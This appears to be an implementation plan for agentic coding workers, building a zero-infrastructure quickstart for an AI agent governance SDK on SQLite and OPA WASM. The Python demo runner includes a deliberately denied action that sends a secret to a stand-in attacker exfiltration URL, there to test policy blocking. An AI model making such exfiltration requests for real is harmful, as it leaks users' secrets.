# Phase 5 · Slice 5e — Zero-Infra Quickstart (SDK-05) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: superpowers:subagent-driven-development. Commits end
> with a second `-m "Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"`. Tests:
> `./.venv/Scripts/python.exe -m pytest`. TDD per task, one commit each. Gates `floor_invariant`
> (430) + `regression_lock` (10) green at every commit.

**Goal (SDK-05):** A single `pip install` + one command runs the full governed loop on **SQLite +
in-process opa-wasm** — no Docker, Postgres, or OPA server. First-run friction matches AGT's
one-decorator pitch.

**Architecture (decision: ship a committed demo WASM).** The quickstart ships a demo Constitution
(`demo_constitution.yaml`) **and a pre-built `policy.wasm`** as package data. At runtime it derives
`lists` / `constitution_version` / `principles_meta` purely in-process from the demo constitution via
`compile_constitution(...)` (no OPA CLI), loads the **committed** `policy.wasm` through
`opa_wasmtime`, wires a real `Pipeline`, registers the demo agent, and runs one allowed + one denied
action through identity → policy → risk → graduated → hash-chained audit on a SQLite DB — then prints
the decisions and a dev API token. A drift-guard test rebuilds the WASM from the shipped source when
an OPA CLI is available and asserts behavioral equivalence.

**Tech Stack:** `agentos_constitution` compiler, `opa_wasmtime`, `agentos_pipeline`, SQLite, pytest.

> First commit in this slice: `docs(phase-5): Slice 5e plan` for this file, then the tasks below.

## File structure
- Create `packages/sdk/src/agentos_sdk/quickstart/__init__.py` — `main()` / `run()` entrypoint.
- Create `packages/sdk/src/agentos_sdk/quickstart/demo_constitution.yaml` — the shipped demo
  Constitution (copy of `tests/fixtures/test_constitution.yaml`, which is known-valid and has the
  egress principle for the allow/deny contrast).
- Create `packages/sdk/src/agentos_sdk/quickstart/policy.wasm` — pre-built once via the vendored OPA
  CLI, committed as package data (NOT gitignored — the gitignore only covers `tools/opa/*` and
  `scripts/_smoke_build/`).
- Modify `packages/sdk/pyproject.toml` — `[project.scripts] agentos-quickstart` + ensure the
  `.yaml`/`.wasm` ship in the wheel; the quickstart depends on `agentos-controlplane`,
  `agentos-pipeline`, `agentos-constitution` (add to SDK deps as needed for the demo wiring).
- Tests: `tests/integration/test_quickstart.py`.

---

### Task 1: ship the demo constitution + pre-built committed WASM

**Files:**
- Create: `.../agentos_sdk/quickstart/__init__.py` (empty for now), `.../quickstart/demo_constitution.yaml`
- Create: `.../quickstart/policy.wasm` (built once, committed)
- Test: `tests/integration/test_quickstart.py` (packaging portion)

**Steps:**
- [ ] Copy `tests/fixtures/test_constitution.yaml` to
  `packages/sdk/src/agentos_sdk/quickstart/demo_constitution.yaml`.
- [ ] Build the WASM once with the vendored OPA CLI and commit it:
  ```bash
  ./.venv/Scripts/python.exe -c "from pathlib import Path; from agentos_constitution import load_constitution, compile_constitution; from agentos_constitution.wasm import build_wasm; from tests._opa import find_opa; b=compile_constitution(load_constitution('packages/sdk/src/agentos_sdk/quickstart/demo_constitution.yaml')); out=Path('packages/sdk/src/agentos_sdk/quickstart'); w=build_wasm(b.rego, out, opa_bin=find_opa()); print('built', w)"
  ```
  (This produces `policy.wasm` in the quickstart dir. The `constitution.rego`/`bundle.tar.gz`
  byproducts it also writes there must NOT be committed — delete them, keep only `policy.wasm`.)
- [ ] Confirm `git status` shows `policy.wasm` as a NEW tracked file (not ignored): `git check-ignore
  packages/sdk/src/agentos_sdk/quickstart/policy.wasm` must print nothing.
- [ ] Failing test: `from importlib.resources import files; p = files("agentos_sdk.quickstart")` —
  assert `(p / "policy.wasm")` exists and is non-empty, and `(p / "demo_constitution.yaml")` loads
  via `load_constitution`. Run → fails (package not present yet) → create the files → passes.
- [ ] Commit `feat(sdk): ship demo constitution + pre-built policy.wasm for the quickstart (SDK-05)`.

---

### Task 2: the quickstart runner + console script

**Files:**
- Modify: `.../agentos_sdk/quickstart/__init__.py`
- Modify: `packages/sdk/pyproject.toml` (`[project.scripts]`, deps, package-data)
- Test: `tests/integration/test_quickstart.py`

```python
"""SDK-05 zero-infra quickstart: the full governed loop on SQLite + in-process opa-wasm, no Docker /
Postgres / OPA server. Loads a COMMITTED demo policy.wasm (built once at authoring time); all other
policy metadata is derived in-process from the demo constitution via the pure-Python compiler."""
from __future__ import annotations

import asyncio
from dataclasses import dataclass
from importlib.resources import files
from pathlib import Path
from tempfile import mkdtemp

from sqlalchemy import create_engine

from agentos_constitution import compile_constitution, load_constitution
from agentos_contract import ActionType, AgentAction, Outcome
from agentos_controlplane.audit import AuditWriter
from agentos_controlplane.auth import resolve_api_token
from agentos_controlplane.registry import Registry
from agentos_controlplane.store.engine import create_all, create_session_factory
from agentos_pipeline.identity import IdentityStage
from agentos_pipeline.policy import ConstitutionPolicyEngine
from agentos_pipeline.posture import PostureMap
from agentos_pipeline.risk import PromptInjectionScorer
from agentos_pipeline.runner import Pipeline

_PKG = files("agentos_sdk.quickstart")
DEMO_AGENT = "quickstart-agent"


@dataclass
class QuickstartResult:
    allow_outcome: Outcome
    deny_outcome: Outcome
    audit_records: int
    api_token: str
    db_path: str


def _build_engine() -> tuple[ConstitutionPolicyEngine, str]:
    """In-process engine from the COMMITTED policy.wasm + pure-Python compiled metadata. No OPA CLI."""
    constitution = load_constitution(str(_PKG / "demo_constitution.yaml"))
    bundle = compile_constitution(constitution)
    principles_meta = {
        p.id: {"title": p.title, "statement": p.statement, "effect": p.effect,
               "side_effects": [s.value for s in p.side_effects], "remediation": p.remediation}
        for p in constitution.principles
    }
    engine = ConstitutionPolicyEngine(
        wasm_path=str(_PKG / "policy.wasm"),
        lists=bundle.lists,
        constitution_version=bundle.constitution_version,
        principles_meta=principles_meta,
    )
    # An allowlisted host for the ALLOW demo (first entry of the egress allowlist).
    allow_host = next(iter(next(iter(bundle.lists.values()), ["example.com"])), "example.com")
    return engine, allow_host


def run(db_path: str | None = None) -> QuickstartResult:
    db_path = db_path or str(Path(mkdtemp(prefix="agentos_quickstart_")) / "quickstart.db")
    engine_db = create_engine(f"sqlite+pysqlite:///{db_path}")
    create_all(engine_db)
    sf = create_session_factory(engine_db)
    registry = Registry(sf)
    token = registry.register(DEMO_AGENT)
    pipeline = Pipeline(
        identity=IdentityStage(registry.identity),
        policy=_build_engine()[0],
        scorers=[PromptInjectionScorer()],
        audit=AuditWriter(sf, signer=registry.identity),
        posture=PostureMap(),
    )
    _, allow_host = _build_engine()

    def act(url: str) -> AgentAction:
        return AgentAction(agent_id=DEMO_AGENT, type=ActionType.tool_call, target="http_get",
                           payload={"url": url, "content": ""}, identity_token=token)

    allow = asyncio.run(pipeline.evaluate(act(f"https://{allow_host}/data")))
    deny = asyncio.run(pipeline.evaluate(act("https://attacker.example/exfil?x=secret")))

    from sqlalchemy import func, select
    from agentos_controlplane.store.models import AuditRecord
    with sf() as s:
        n = s.scalar(select(func.count()).select_from(AuditRecord))

    api_token = resolve_api_token(None)
    return QuickstartResult(allow.outcome, deny.outcome, n, api_token, db_path)


def main() -> None:
    r = run()
    print("agentos-guard quickstart — full governed loop on SQLite + in-process opa-wasm\n")
    print(f"  allowed action  -> {r.allow_outcome.value}")
    print(f"  exfil action    -> {r.deny_outcome.value}")
    print(f"  audit records   -> {r.audit_records} (hash-chained, signed)")
    print(f"  sqlite db       -> {r.db_path}")
    print(f"\n  dev API token (for the control-plane API / dashboard): {r.api_token}")
    print("  start the API:   uvicorn-style create_app(...) — see the dashboard slice (5f)")
```

`pyproject.toml`: add `[project.scripts]` `agentos-quickstart = "agentos_sdk.quickstart:main"`;
add `agentos-controlplane`, `agentos-pipeline`, `agentos-constitution` to dependencies; ensure
`*.wasm` + `*.yaml` ship (hatchling includes package-dir files by default — verify the wheel
contains them, add `[tool.hatch.build.targets.wheel.force-include]` only if a build check shows them
missing).

**Steps (TDD):**
- [ ] Failing test: `from agentos_sdk.quickstart import run; r = run()`; assert `r.allow_outcome is
  Outcome.allow`, `r.deny_outcome is Outcome.deny`, `r.audit_records == 2`, `r.api_token` non-empty.
  CRUCIALLY this must pass with NO OPA CLI involved (it loads the committed wasm) — assert
  `agentos_constitution.wasm.build_wasm` is NOT called (monkeypatch it to raise, then run → still
  succeeds). Run → fails.
- [ ] Implement the runner + pyproject. Run → passes.
- [ ] Commit `feat(sdk): zero-infra quickstart runner + console script (SDK-05)`.

---

### Task 3: drift-guard test (rebuild-and-compare when OPA available)

**Files:**
- Test: `tests/integration/test_quickstart.py`

**Steps (TDD):**
- [ ] Add a test that, only when `tests._opa.find_opa()` is not None (else `pytest.skip`), rebuilds
  the WASM from the shipped `demo_constitution.yaml` into a temp dir via `build_constitution_wasm`,
  constructs a second `ConstitutionPolicyEngine` from the REBUILT wasm, and asserts it produces the
  SAME outcomes as the committed-wasm engine on the demo allow + deny actions AND the same
  `constitution_version`. (Behavioral equivalence, not byte-compare — WASM bytes can differ across
  OPA versions/platforms; behavior must not.) Run with OPA present → passes; with OPA absent → skips
  cleanly.
- [ ] Commit `test(sdk): quickstart WASM drift guard — committed vs rebuilt behavioral parity (SDK-05)`.

---

### Task 4: full gate
- [ ] `pytest -q` green; `-m floor_invariant` 430; `-m regression_lock` 10; `-m latency` healthy.
- [ ] Manually run `./.venv/Scripts/python.exe -m agentos_sdk.quickstart` (or `agentos-quickstart`)
  and paste the printed allow/deny/audit output into the report (the human-facing zero-infra proof).
- [ ] Commit only if incidental fixes were needed.

## Self-review
SDK-05: one command runs the full governed loop (identity → policy(committed opa-wasm) → risk →
graduated → hash-chained signed audit) on SQLite, with ZERO external infra — no Docker, no Postgres,
no OPA server, and (the committed-wasm decision) no OPA CLI at run time; the only policy metadata
needed beyond the wasm is derived in-process by the pure-Python compiler. A monkeypatched-build_wasm
test proves the committed wasm path needs no CLI; a drift guard rebuilds-and-compares behaviorally
when OPA is present (skips otherwise), bounding the committed-binary drift risk. Demo proves one allow
+ one deny + 2 audit records. Gates green; nothing on the per-action hot path changed.
